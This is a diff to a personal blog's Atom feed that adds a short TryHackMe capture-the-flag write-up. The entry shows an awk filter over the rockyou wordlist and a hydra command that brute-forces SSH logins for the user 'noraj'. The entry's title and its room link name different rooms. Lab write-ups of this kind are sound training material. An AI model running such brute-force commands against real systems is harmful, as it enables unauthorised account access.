@@ -4,13 +4,41 @@
  <title>0xbeven - Blog Site</title>
  <link href="https://beven.co.zw/atom.xml" rel="self"/>
  <link href="https://beven.co.zw/"/>
- <updated>2021-05-24T23:31:25+02:00</updated>
+ <updated>2021-05-25T15:26:16+02:00</updated>
  <id>https://beven.co.zw</id>
  <author>
    <name>Beven Nyamande</name>
    <email>wasp00007@gmail.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Red Stone One Carat - TryHackMe Room</title>
+   <link href="https://beven.co.zw/2021/05/25/red-stone-one-caratthm"/>
+   <updated>2021-05-25T00:00:00+02:00</updated>
+   <id>https://beven.co.zw/2021/05/25/Red-Stone-One-CaratTHM</id>
+   <content type="html">&lt;p&gt;Room: &lt;a href=&quot;https://tryhackme.com/room/startup&quot;&gt;Startup&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration-&quot;&gt;Enumeration &lt;nmap&gt;&lt;/nmap&gt;&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Start by enumerating the box&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;port-22-open&quot;&gt;Port 22 open&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;use “noraj” to bruteforce the box&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;c&quot;&gt;# since the hint tells us that the password contains 'bu'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/bu/'&lt;/span&gt; rockyou.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; wordlist.txt
+
+hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; noraj &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; wordlist.txt ssh://IP &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>Year of the Jellyfish - TryHackMe Room</title>
